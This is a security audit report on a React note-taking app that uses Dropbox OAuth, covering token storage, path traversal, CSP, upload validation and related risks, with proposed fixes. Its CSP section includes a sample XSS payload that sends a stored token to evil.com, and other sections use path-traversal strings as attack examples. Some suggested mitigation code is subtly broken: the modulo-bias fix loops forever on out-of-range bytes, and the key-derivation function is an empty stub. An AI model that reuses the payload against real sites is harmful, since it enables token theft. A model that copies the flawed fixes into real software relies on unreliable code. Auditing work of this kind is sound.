# Security Analysis Report
## DropSidian Application

**Date:** 2025-01-27  
**Analyst:** Security Expert Review  
**Scope:** Full-stack React application with Dropbox OAuth integration

---

## Executive Summary

This analysis identifies **12 security risks** across authentication, data handling, input validation, and client-side security. The application demonstrates good security practices in OAuth implementation (PKCE) and path sanitization, but has several critical gaps that could lead to token exposure, path traversal, and information disclosure.

**Risk Distribution:**
- **Critical (3):** Token storage, path traversal edge cases, environment variable exposure
- **High (4):** File upload validation, error message leakage, missing CSP, session storage risks
- **Medium (3):** Input validation gaps, race conditions, missing rate limiting
- **Low (2):** Debug logging, dependency management

---

## 1. Critical Risks

### 1.1 Unencrypted Token Storage in IndexedDB

**Risk Level:** 🔴 **CRITICAL**

**Location:** `src/lib/token-storage.ts`

**Issue:**
Refresh tokens are stored in IndexedDB without encryption. While IndexedDB is sandboxed per origin, any JavaScript running in the same origin context (including compromised dependencies or XSS) can access these tokens.

```22:33:src/lib/token-storage.ts
export async function storeRefreshToken(refreshToken: string): Promise<void> {
  const db = await openDatabase()

  return new Promise((resolve, reject) => {
    const transaction = db.transaction(STORE_NAME, 'readwrite')
    const store = transaction.objectStore(STORE_NAME)
    const request = store.put(refreshToken, TOKEN_KEY)

    request.onerror = () => reject(request.error)
    request.onsuccess = () => resolve()
  })
}
```

**Exploitation Scenario:**
1. Attacker injects malicious script via compromised npm package or XSS
2. Script reads refresh token from IndexedDB: `const token = await getRefreshToken()`
3. Attacker uses token to obtain new access tokens indefinitely
4. Full account compromise without user knowledge

**Impact:**
- Complete account takeover
- Persistent access even after user logs out (until token revocation)
- Access to all Dropbox files and folders

**Mitigation:**
```typescript
// Use Web Crypto API for encryption
async function encryptToken(token: string): Promise<string> {
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(await deriveKey()),
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt']
  )
  
  const iv = crypto.getRandomValues(new Uint8Array(12))
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    new TextEncoder().encode(token)
  )
  
  return JSON.stringify({
    iv: Array.from(iv),
    data: Array.from(new Uint8Array(encrypted))
  })
}

async function deriveKey(): Promise<string> {
  // Derive key from user-specific secret (e.g., account ID + app secret)
  // Store only in memory, never persist
}
```

**Alternative (Simpler):** Use `sessionStorage` for refresh tokens instead of `localStorage`/IndexedDB, accepting that tokens are lost on tab close. This reduces attack window significantly.

---

### 1.2 Path Traversal Vulnerability in File Operations

**Risk Level:** 🔴 **CRITICAL**

**Location:** `src/lib/path-utils.ts`, `src/components/AttachmentUploader.tsx`

**Issue:**
While `sanitizePath()` handles basic `..` sequences, there are edge cases where path traversal can still occur:

1. **Double encoding:** `%2e%2e%2f` → `../` after URL decoding
2. **Mixed separators:** `..\` or `..//` combinations
3. **Unicode normalization:** Similar-looking Unicode characters
4. **Race conditions:** Path validation vs. actual API call

```11:24:src/lib/path-utils.ts
export function sanitizePath(path: string): string {
  const parts = path.split('/').filter(Boolean)
  const normalized: string[] = []

  for (const part of parts) {
    if (part === '..') {
      normalized.pop()
    } else if (part !== '.') {
      normalized.push(part)
    }
  }

  return '/' + normalized.join('/')
}
```

**Exploitation Scenario:**
1. Attacker crafts malicious filename: `../../../Dropbox/Private/secret.md`
2. Upload component constructs path: `${parentPath}/${file.name}`
3. `sanitizePath()` may not catch all edge cases
4. File uploaded outside intended vault directory
5. Sensitive files exposed or overwritten

**Impact:**
- Unauthorized file access outside vault
- Data exfiltration
- File corruption/deletion

**Mitigation:**
```typescript
export function sanitizePath(path: string): string {
  // Decode URL encoding first
  let decoded = decodeURIComponent(path)
  
  // Normalize all path separators
  decoded = decoded.replace(/\\/g, '/')
  
  // Remove null bytes (path traversal in some systems)
  decoded = decoded.replace(/\0/g, '')
  
  // Split and normalize
  const parts = decoded.split('/').filter(Boolean)
  const normalized: string[] = []

  for (const part of parts) {
    // Normalize Unicode (NFKC)
    const normalizedPart = part.normalize('NFKC')
    
    // Reject any remaining traversal attempts
    if (normalizedPart === '..' || normalizedPart.startsWith('..')) {
      normalized.pop()
      continue
    }
    
    if (normalizedPart !== '.' && normalizedPart !== '') {
      normalized.push(normalizedPart)
    }
  }

  return '/' + normalized.join('/')
}

// Add strict validation before API calls
export function validatePathWithinVault(
  path: string, 
  vaultRoot: string
): boolean {
  const sanitized = sanitizePath(path)
  const normalizedVault = sanitizePath(vaultRoot).toLowerCase()
  const normalizedPath = sanitized.toLowerCase()
  
  // Must start with vault root exactly
  if (!normalizedPath.startsWith(normalizedVault)) {
    return false
  }
  
  // Ensure no traversal after normalization
  return !sanitized.includes('..') && !sanitized.includes('//')
}
```

**Usage:**
```typescript
// In AttachmentUploader.tsx
const uploadPath = `${parentPath}/${file.name}`
if (!validatePathWithinVault(uploadPath, vaultPath)) {
  throw new Error('Invalid file path')
}
```

---

### 1.3 Client-Side Environment Variable Exposure

**Risk Level:** 🔴 **CRITICAL**

**Location:** `src/lib/dropbox-auth.ts`, Build process

**Issue:**
`VITE_DROPBOX_APP_KEY` is embedded in client-side JavaScript bundle. While OAuth app keys are considered "public" in OAuth 2.0, exposing them makes the application vulnerable to:

1. **App key theft:** Attacker can create phishing sites using your app key
2. **Rate limiting bypass:** Attacker uses your quota
3. **Brand impersonation:** Legitimate-looking OAuth flows

```8:16:src/lib/dropbox-auth.ts
const DROPBOX_APP_KEY = import.meta.env.VITE_DROPBOX_APP_KEY as string
const REDIRECT_URI = import.meta.env.VITE_REDIRECT_URI as string

debugLog('Environment config', {
  DROPBOX_APP_KEY: DROPBOX_APP_KEY ? `${DROPBOX_APP_KEY.substring(0, 4)}...` : 'NOT SET',
  REDIRECT_URI: REDIRECT_URI || 'NOT SET',
  currentOrigin: typeof window !== 'undefined' ? window.location.origin : 'N/A',
  currentHref: typeof window !== 'undefined' ? window.location.href : 'N/A',
})
```

**Exploitation Scenario:**
1. Attacker inspects JavaScript bundle: `dist/assets/index-*.js`
2. Extracts `VITE_DROPBOX_APP_KEY` value
3. Creates phishing site with identical OAuth flow
4. Users authenticate thinking it's legitimate
5. Attacker captures authorization codes

**Impact:**
- Brand reputation damage
- User trust erosion
- Potential account compromise if redirect URI validation fails

**Mitigation:**
1. **Use OAuth redirect URI validation strictly:**
   - Configure exact redirect URIs in Dropbox app settings
   - Reject any authorization codes not from approved URIs

2. **Add origin validation:**
```typescript
export async function buildAuthUrl(): Promise<string> {
  // Validate current origin matches expected
  const expectedOrigin = import.meta.env.VITE_EXPECTED_ORIGIN
  if (typeof window !== 'undefined' && window.location.origin !== expectedOrigin) {
    throw new Error('Invalid origin')
  }
  
  // ... rest of function
}
```

3. **Monitor for abuse:**
   - Set up Dropbox app analytics
   - Alert on unusual OAuth patterns
   - Implement rate limiting per IP

4. **Consider backend proxy (if feasible):**
   - Move OAuth initiation to backend
   - App key never exposed to client

**Note:** This is partially acceptable for OAuth public clients, but should be monitored and protected with strict redirect URI validation.

---

## 2. High Risks

### 2.1 Insufficient File Upload Validation

**Risk Level:** 🟠 **HIGH**

**Location:** `src/components/AttachmentUploader.tsx`, `src/hooks/usePasteImage.ts`

**Issue:**
File uploads accept any file type with minimal validation. While `accept="image/*,.pdf"` provides UI-level filtering, this can be bypassed. No server-side validation, file size limits, or content-type verification.

```24:41:src/components/AttachmentUploader.tsx
const handleFileChange = async (event: React.ChangeEvent<HTMLInputElement>) => {
  const file = event.target.files?.[0]
  if (!file) return

  const parentPath = getParentPath(currentNotePath)
  const uploadPath = `${parentPath}/${file.name}`

  setUploading(true)
  try {
    await uploadBinaryFile(accessToken, uploadPath, file)
    onUploadComplete(file.name)
  } finally {
    setUploading(false)
    if (fileInputRef.current) {
      fileInputRef.current.value = ''
    }
  }
}
```

**Exploitation Scenario:**
1. Attacker uploads malicious file: `malware.exe` (renamed to `malware.png`)
2. File stored in Dropbox vault
3. User downloads file, thinking it's an image
4. Executes file → malware infection
5. Or: Large file upload → storage quota exhaustion

**Impact:**
- Malware distribution
- Storage quota exhaustion (DoS)
- Reputation damage if malicious files shared

**Mitigation:**
```typescript
const MAX_FILE_SIZE = 10 * 1024 * 1024 // 10MB
const ALLOWED_TYPES = ['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'application/pdf']

function validateFile(file: File): void {
  // Size check
  if (file.size > MAX_FILE_SIZE) {
    throw new Error(`File too large. Maximum size: ${MAX_FILE_SIZE / 1024 / 1024}MB`)
  }
  
  // Type check (don't trust file extension)
  if (!ALLOWED_TYPES.includes(file.type)) {
    throw new Error(`File type not allowed: ${file.type}`)
  }
  
  // Filename sanitization
  const sanitizedName = sanitizeFilename(file.name)
  if (sanitizedName !== file.name) {
    throw new Error('Invalid filename')
  }
}

// In handleFileChange:
const file = event.target.files?.[0]
if (!file) return

validateFile(file) // Add validation

// Also validate filename before constructing path
const sanitizedName = sanitizeFilename(file.name)
const uploadPath = `${parentPath}/${sanitizedName}`
```

**Additional:** Consider client-side image validation (verify file headers match declared type).

---

### 2.2 Error Message Information Disclosure

**Risk Level:** 🟠 **HIGH**

**Location:** Multiple files, especially `src/lib/dropbox-client.ts`

**Issue:**
Error messages expose sensitive information including:
- Internal file paths
- API error details
- Token-related errors
- System architecture details

```111:114:src/lib/dropbox-auth.ts
if (!response.ok) {
  const error = await response.text()
  throw new Error(`Token exchange failed: ${error}`)
}
```

**Exploitation Scenario:**
1. Attacker triggers error condition
2. Error message reveals: `"Token exchange failed: invalid_client: App key 'abc123...' not found"`
3. Attacker learns app key format/structure
4. Error reveals file paths: `"Failed to download file: path '/vault/../../etc/passwd' not found"`
5. Attacker maps internal structure

**Impact:**
- Information leakage aids further attacks
- Path enumeration
- System fingerprinting

**Mitigation:**
```typescript
// Create error sanitization utility
function sanitizeError(error: unknown, context: string): Error {
  if (error instanceof Error) {
    // Log full error server-side (if applicable) or to console in dev only
    if (import.meta.env.DEV) {
      console.error(`[${context}]`, error)
    }
    
    // Return generic user-facing error
    const message = error.message.toLowerCase()
    
    if (message.includes('token') || message.includes('auth')) {
      return new Error('Authentication failed. Please try logging in again.')
    }
    
    if (message.includes('path') || message.includes('file')) {
      return new Error('File operation failed. Please check the file path.')
    }
    
    if (message.includes('network') || message.includes('fetch')) {
      return new Error('Network error. Please check your connection.')
    }
    
    return new Error('An error occurred. Please try again.')
  }
  
  return new Error('An unexpected error occurred.')
}

// Usage:
if (!response.ok) {
  const errorText = await response.text()
  throw sanitizeError(new Error(`Token exchange failed: ${errorText}`), 'oauth')
}
```

---

### 2.3 Missing Content Security Policy (CSP)

**Risk Level:** 🟠 **HIGH**

**Location:** `index.html`, Deployment configuration

**Issue:**
No Content Security Policy headers configured. This leaves the application vulnerable to XSS attacks, even if `react-markdown` is generally safe.

**Exploitation Scenario:**
1. Attacker finds XSS vulnerability in markdown rendering or dependency
2. Injects malicious script: `<script>fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))</script>`
3. Script executes in user's browser
4. Sensitive data exfiltrated

**Impact:**
- XSS attacks enabled
- Token theft
- Session hijacking

**Mitigation:**
Add CSP meta tag to `index.html`:

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';  <!-- Required for Vite dev -->
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://*.dropboxapi.com https://*.dropboxusercontent.com;
  connect-src 'self' https://*.dropboxapi.com https://*.dropbox.com;
  font-src 'self' data:;
  frame-ancestors 'none';
">
```

**For production builds**, remove `'unsafe-inline'` and `'unsafe-eval'`:

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';  <!-- CSS-in-JS may require this -->
  img-src 'self' data: https://*.dropboxapi.com https://*.dropboxusercontent.com;
  connect-src 'self' https://*.dropboxapi.com https://*.dropbox.com;
  font-src 'self' data:;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
">
```

**Additional:** Configure CSP via HTTP headers in deployment (GitHub Pages, CDN, etc.) for stronger enforcement.

---

### 2.4 Session Storage Race Condition in OAuth Flow

**Risk Level:** 🟠 **HIGH**

**Location:** `src/pages/Callback.tsx`, `src/lib/dropbox-auth.ts`

**Issue:**
OAuth state and code verifier stored in `sessionStorage` can be accessed by multiple tabs/windows. Race conditions possible if user opens multiple OAuth flows simultaneously.

```21:26:src/lib/dropbox-auth.ts
export function storeCodeVerifier(verifier: string): void {
  sessionStorage.setItem(CODE_VERIFIER_KEY, verifier)
}

export function storeOAuthState(state: string): void {
  sessionStorage.setItem(OAUTH_STATE_KEY, state)
}
```

**Exploitation Scenario:**
1. User initiates OAuth flow in Tab A (state: `abc123`)
2. User opens new tab, initiates OAuth flow in Tab B (state: `xyz789`)
3. Tab B overwrites `sessionStorage` with new state/verifier
4. Tab A receives callback with state `abc123`, but verifier is now `xyz789`
5. Token exchange fails OR worse: Tab B's callback uses Tab A's verifier

**Impact:**
- OAuth flow failures
- Potential token leakage between sessions
- User confusion

**Mitigation:**
```typescript
// Use state-specific storage keys
export function storeCodeVerifier(verifier: string, state: string): void {
  const key = `${CODE_VERIFIER_KEY}_${state}`
  sessionStorage.setItem(key, verifier)
  // Store mapping: state -> verifier key
  const mappings = JSON.parse(sessionStorage.getItem(VERIFIER_MAPPINGS_KEY) || '{}')
  mappings[state] = key
  sessionStorage.setItem(VERIFIER_MAPPINGS_KEY, JSON.stringify(mappings))
}

export function getStoredCodeVerifier(state: string): string | null {
  const mappings = JSON.parse(sessionStorage.getItem(VERIFIER_MAPPINGS_KEY) || '{}')
  const key = mappings[state]
  if (!key) return null
  return sessionStorage.getItem(key)
}

// Clean up after successful exchange
export function clearCodeVerifier(state: string): void {
  const mappings = JSON.parse(sessionStorage.getItem(VERIFIER_MAPPINGS_KEY) || '{}')
  const key = mappings[state]
  if (key) {
    sessionStorage.removeItem(key)
    delete mappings[state]
    sessionStorage.setItem(VERIFIER_MAPPINGS_KEY, JSON.stringify(mappings))
  }
}
```

**Simpler alternative:** Use `Map` in memory (per-tab) instead of `sessionStorage` for verifiers, accepting that refresh loses state.

---

## 3. Medium Risks

### 3.1 Input Validation Gaps in Path Construction

**Risk Level:** 🟡 **MEDIUM**

**Location:** `src/pages/Home.tsx`, `src/components/SettingsModal.tsx`

**Issue:**
User-provided paths (vault path, inbox path) are concatenated without sufficient validation before API calls.

```72:74:src/pages/Home.tsx
const noteName = generateNoteName()
const noteFullPath = `${vaultPath}/${inboxPath}/${noteName}.md`

await uploadFile(accessToken, noteFullPath, '')
```

**Exploitation Scenario:**
1. User sets inbox path to: `../../../OtherFolder`
2. Note created outside intended vault
3. Data leakage or corruption

**Mitigation:**
```typescript
// Validate all user-provided paths
function validateVaultPath(path: string): boolean {
  const sanitized = sanitizePath(path)
  // Must be absolute, no traversal, reasonable length
  return (
    sanitized.startsWith('/') &&
    !sanitized.includes('..') &&
    sanitized.length < 500 &&
    /^\/[a-zA-Z0-9_\-/]+$/.test(sanitized) // Alphanumeric, underscores, hyphens, slashes only
  )
}

// Before using:
if (!validateVaultPath(vaultPath) || !validateVaultPath(inboxPath)) {
  throw new Error('Invalid path')
}
```

---

### 3.2 Missing Rate Limiting

**Risk Level:** 🟡 **MEDIUM**

**Issue:**
No client-side or server-side rate limiting on:
- OAuth token refresh
- File uploads
- API calls

**Exploitation Scenario:**
1. Attacker script rapidly refreshes tokens
2. Dropbox API rate limits exceeded
3. Legitimate users blocked
4. Or: Rapid file uploads → storage exhaustion

**Mitigation:**
```typescript
// Simple client-side rate limiter
class RateLimiter {
  private requests: Map<string, number[]> = new Map()
  
  check(key: string, maxRequests: number, windowMs: number): boolean {
    const now = Date.now()
    const requests = this.requests.get(key) || []
    
    // Remove old requests outside window
    const recent = requests.filter(time => now - time < windowMs)
    
    if (recent.length >= maxRequests) {
      return false
    }
    
    recent.push(now)
    this.requests.set(key, recent)
    return true
  }
}

const apiLimiter = new RateLimiter()

// Before API calls:
if (!apiLimiter.check('dropbox-api', 60, 60000)) { // 60 requests per minute
  throw new Error('Rate limit exceeded. Please wait.')
}
```

**Note:** Client-side rate limiting is easily bypassed. Consider backend proxy for true rate limiting.

---

### 3.3 Insecure Random String Generation (Minor)

**Risk Level:** 🟡 **MEDIUM**

**Location:** `src/lib/pkce.ts`

**Issue:**
While `crypto.getRandomValues()` is cryptographically secure, the modulo operation introduces slight bias. For OAuth state (32 chars), this is acceptable but not ideal.

```1:8:src/lib/pkce.ts
export function generateRandomString(length: number): string {
  const charset =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklopqrstuvwxyz0123456789-._~'
  const randomValues = crypto.getRandomValues(new Uint8Array(length))
  return Array.from(randomValues)
    .map((v) => charset[v % charset.length])
    .join('')
}
```

**Impact:** Minimal - bias is negligible for 32-character strings, but best practice is to avoid modulo bias.

**Mitigation:**
```typescript
export function generateRandomString(length: number): string {
  const charset =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~'
  const charsetLength = charset.length
  const maxValid = Math.floor(256 / charsetLength) * charsetLength - 1
  
  const randomValues = crypto.getRandomValues(new Uint8Array(length))
  const result: string[] = []
  
  for (let i = 0; i < length; i++) {
    let randomByte
    do {
      randomByte = randomValues[i]
    } while (randomByte > maxValid)
    
    result.push(charset[randomByte % charsetLength])
  }
  
  return result.join('')
}
```

**Note:** This is a minor issue. Current implementation is acceptable for OAuth state.

---

## 4. Low Risks

### 4.1 Debug Logging in Production

**Risk Level:** 🟢 **LOW**

**Location:** `src/lib/logger.ts`, throughout codebase

**Issue:**
Debug logs may expose sensitive information. While `import.meta.env.DEV` check exists, ensure no accidental production logging.

**Mitigation:**
```typescript
// Ensure logger respects environment
export const debugLog = createLogger(import.meta.env.DEV && import.meta.env.MODE !== 'production')
```

---

### 4.2 Dependency Vulnerabilities

**Risk Level:** 🟢 **LOW**

**Issue:**
No automated dependency scanning visible. Dependencies should be regularly audited.

**Mitigation:**
```bash
# Add to package.json scripts
"audit": "npm audit",
"audit:fix": "npm audit fix"

# Or use Dependabot / Snyk for automated scanning
```

---

## 5. Positive Security Practices Observed

✅ **PKCE Implementation:** Proper use of code verifier/challenge  
✅ **OAuth State Validation:** CSRF protection via state parameter  
✅ **Path Sanitization:** Basic protection against path traversal  
✅ **React Markdown:** Safe markdown rendering (no `dangerouslySetInnerHTML`)  
✅ **Type Safety:** TypeScript reduces type-related vulnerabilities  
✅ **No eval():** No use of `eval()` or `Function()` constructor  

---

## 6. Recommended Security Improvements Priority

### Immediate (Critical)
1. ✅ Encrypt tokens in IndexedDB or use sessionStorage
2. ✅ Strengthen path traversal protection
3. ✅ Add CSP headers
4. ✅ Sanitize error messages

### Short-term (High)
5. ✅ Add file upload validation (size, type, content)
6. ✅ Fix OAuth session storage race conditions
7. ✅ Add rate limiting
8. ✅ Validate all user-provided paths

### Medium-term (Medium/Low)
9. ✅ Implement dependency scanning
10. ✅ Add security headers (HSTS, X-Frame-Options, etc.)
11. ✅ Security testing in CI/CD
12. ✅ Regular security audits

---

## 7. Ongoing Defensive Practices

1. **Regular Dependency Updates:**
   - Weekly: `npm audit`
   - Monthly: Update dependencies
   - Quarterly: Review and remove unused dependencies

2. **Security Monitoring:**
   - Monitor Dropbox app analytics for unusual OAuth patterns
   - Set up error tracking (Sentry, etc.) with PII filtering
   - Log security events (failed auth, path validation failures)

3. **Code Review Checklist:**
   - ✅ All user inputs validated and sanitized
   - ✅ No secrets in code or logs
   - ✅ Error messages don't leak information
   - ✅ Path operations validated
   - ✅ File operations have size/type limits

4. **Incident Response:**
   - Document process for token revocation
   - User notification procedure for breaches
   - Rollback plan for security patches

---

## 8. Testing Recommendations

1. **Security Testing:**
   ```bash
   # Add security test suite
   npm install --save-dev @owasp/dependency-check
   npm run security-test
   ```

2. **Penetration Testing:**
   - Test path traversal with various encodings
   - Test OAuth flow with multiple tabs
   - Test file upload with malicious files
   - Test XSS in markdown content

3. **Automated Scanning:**
   - OWASP ZAP for web app scanning
   - Snyk for dependency vulnerabilities
   - ESLint security plugins

---

## Conclusion

The application demonstrates solid security fundamentals but requires immediate attention to token storage, path validation, and error handling. Implementing the critical and high-priority mitigations will significantly improve the security posture.

**Overall Security Posture:** 🟡 **MODERATE**  
**Recommendation:** Address critical issues before production deployment.

---

*This analysis follows OWASP Top 10 (2021) and focuses on practical, implementable mitigations.*


